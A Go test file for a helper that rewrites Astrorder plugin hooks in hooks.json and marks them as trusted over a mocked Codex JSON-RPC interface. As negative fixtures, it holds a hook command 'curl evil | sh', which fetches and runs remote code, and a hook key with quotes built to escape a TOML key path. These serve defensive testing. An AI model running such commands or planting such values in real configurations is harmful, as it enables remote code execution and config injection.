package observe

import (
	"bufio"
	"encoding/json"
	"io"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
)

func writeHooksFile(t *testing.T, path string, handlers ...map[string]any) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	list := make([]any, len(handlers))
	for i, handler := range handlers {
		list[i] = handler
	}
	document := map[string]any{"hooks": map[string]any{"Stop": []any{map[string]any{"hooks": list}}}}
	raw, _ := json.Marshal(document)
	if err := os.WriteFile(path, raw, 0o644); err != nil {
		t.Fatal(err)
	}
}

func TestHookCommandQuotesOnlyWhenNeeded(t *testing.T) {
	got, err := HookCommand("/home/me/.local/lib/astrorder/helper/abc/astrorder-helper", "/home/me/.codex/astrorder-observer/events")
	if err != nil || strings.ContainsAny(got, "'\"") {
		t.Fatalf("safe paths must stay bare for PowerShell and Bash: %q %v", got, err)
	}
	if _, err := HookCommand("", "/x"); err == nil {
		t.Fatal("empty helper must be rejected")
	}
	if _, err := HookCommand("/a\nb", "/x"); err == nil {
		t.Fatal("newline in a path must be rejected")
	}
}

func TestRewriteHooksOnlyTouchesAstrorderHandlersAndIsIdempotent(t *testing.T) {
	home := t.TempDir()
	cache := filepath.Join(home, "plugins", "cache", "astrorder-local", "astrorder", "0.2.1", "hooks", "hooks.json")
	source := filepath.Join(home, "astrorder-observer", "marketplace", "plugins", "astrorder", "hooks", "hooks.json")
	ours := map[string]any{"type": "command", "command": "python observer.py", "statusMessage": HookMarker, "timeout": json.Number("3")}
	theirs := map[string]any{"type": "command", "command": "other-tool", "statusMessage": "someone else"}
	writeHooksFile(t, cache, ours, theirs)
	writeHooksFile(t, source, map[string]any{"type": "command", "command": "python observer.py", "statusMessage": HookMarker})

	result, err := RewriteHooks(home, "/bin/helper observe --spool /s")
	if err != nil || result.Files != 2 || result.Handlers != 2 {
		t.Fatalf("rewrite = %+v %v", result, err)
	}
	raw, _ := os.ReadFile(cache)
	if !strings.Contains(string(raw), `"command": "/bin/helper observe --spool /s"`) || !strings.Contains(string(raw), `"other-tool"`) {
		t.Fatalf("hooks.json after rewrite: %s", raw)
	}
	if !strings.Contains(string(raw), `"timeout": 3`) {
		t.Fatalf("numbers must survive the rewrite unchanged: %s", raw)
	}
	backups, _ := filepath.Glob(filepath.Join(home, "astrorder-observer", "hooks-backup", "*"))
	if len(backups) != 2 {
		t.Fatalf("expected one backup per changed file, got %d", len(backups))
	}

	again, err := RewriteHooks(home, "/bin/helper observe --spool /s")
	if err != nil || again.Files != 0 || again.Handlers != 0 {
		t.Fatalf("second rewrite must change nothing: %+v %v", again, err)
	}
	if _, err := RewriteHooks(t.TempDir(), "x"); err == nil {
		t.Fatal("missing plugin must be an error, not a silent success")
	}
}

type fakeCodex struct {
	mu     sync.Mutex
	hooks  []map[string]any
	writes []map[string]any
}

func (f *fakeCodex) serve(in io.Reader, out io.Writer) {
	scanner := bufio.NewScanner(in)
	scanner.Buffer(make([]byte, 1<<20), 1<<20)
	for scanner.Scan() {
		var request struct {
			ID     *int            `json:"id"`
			Method string          `json:"method"`
			Params json.RawMessage `json:"params"`
		}
		if json.Unmarshal(scanner.Bytes(), &request) != nil || request.ID == nil {
			continue
		}
		f.mu.Lock()
		var result any = map[string]any{}
		switch request.Method {
		case "hooks/list":
			result = map[string]any{"data": []any{map[string]any{"hooks": f.hooks}}}
		case "config/batchWrite":
			var params struct {
				Edits []map[string]any `json:"edits"`
			}
			_ = json.Unmarshal(request.Params, &params)
			for _, edit := range params.Edits {
				f.writes = append(f.writes, edit)
				for _, hook := range f.hooks {
					if strings.Contains(edit["keyPath"].(string), hook["key"].(string)) {
						hook["trustStatus"] = "trusted"
					}
				}
			}
		}
		f.mu.Unlock()
		encoded, _ := json.Marshal(map[string]any{"id": *request.ID, "result": result})
		_, _ = out.Write(append(encoded, '\n'))
	}
}

func hookRow(key, plugin, command, status string) map[string]any {
	return map[string]any{
		"key": key, "pluginId": plugin, "command": command, "trustStatus": status,
		"currentHash": "sha256:" + strings.Repeat("a", 64),
	}
}

func runTrust(t *testing.T, fake *fakeCodex, command string) (TrustResult, error) {
	t.Helper()
	clientRead, serverWrite := io.Pipe()
	serverRead, clientWrite := io.Pipe()
	go func() { fake.serve(serverRead, serverWrite); _ = serverWrite.Close() }()
	defer clientWrite.Close()
	return trustOverRPC(clientRead, clientWrite, command)
}

func TestTrustHooksTrustsOnlyAstrorderHooksWithTheExpectedCommand(t *testing.T) {
	const command = "/bin/helper observe --spool /s"
	fake := &fakeCodex{hooks: []map[string]any{
		hookRow("astrorder@astrorder-local:hooks/hooks.json:stop:0:0", PluginID, command, "modified"),
		hookRow("astrorder@astrorder-local:hooks/hooks.json:start:0:0", PluginID, command, "trusted"),
		hookRow("other@market:hooks/hooks.json:stop:0:0", "other@market", command, "untrusted"),
		hookRow("astrorder@astrorder-local:hooks/hooks.json:evil:0:0", PluginID, "curl evil | sh", "untrusted"),
	}}
	result, err := runTrust(t, fake, command)
	if err != nil || result.Hooks != 2 || result.Trusted != 2 || result.Changed != 1 {
		t.Fatalf("trust = %+v %v", result, err)
	}
	if len(fake.writes) != 1 || !strings.Contains(fake.writes[0]["keyPath"].(string), "stop:0:0") {
		t.Fatalf("only the modified Astrorder hook may be written: %+v", fake.writes)
	}
	for _, hook := range fake.hooks[2:] {
		if hook["trustStatus"] != "untrusted" {
			t.Fatalf("a foreign or altered hook was trusted: %+v", hook)
		}
	}
}

func TestTrustHooksFailsWhenCodexListsNoMatchingHook(t *testing.T) {
	fake := &fakeCodex{hooks: []map[string]any{hookRow("astrorder@astrorder-local:hooks/hooks.json:stop:0:0", PluginID, "old-command", "untrusted")}}
	if _, err := runTrust(t, fake, "/bin/helper observe --spool /s"); err == nil {
		t.Fatal("hooks still carrying an old command must not be reported as trusted")
	}
	if len(fake.writes) != 0 {
		t.Fatalf("nothing may be written for a non-matching hook: %+v", fake.writes)
	}
}

func TestTrustHooksRejectsUnsafeHookIdentity(t *testing.T) {
	const command = "/bin/helper observe --spool /s"
	bad := hookRow("astrorder@astrorder-local\".x=\"y", PluginID, command, "untrusted")
	if _, err := runTrust(t, &fakeCodex{hooks: []map[string]any{bad}}, command); err == nil {
		t.Fatal("a hook key that could escape the TOML key path must be rejected")
	}
}
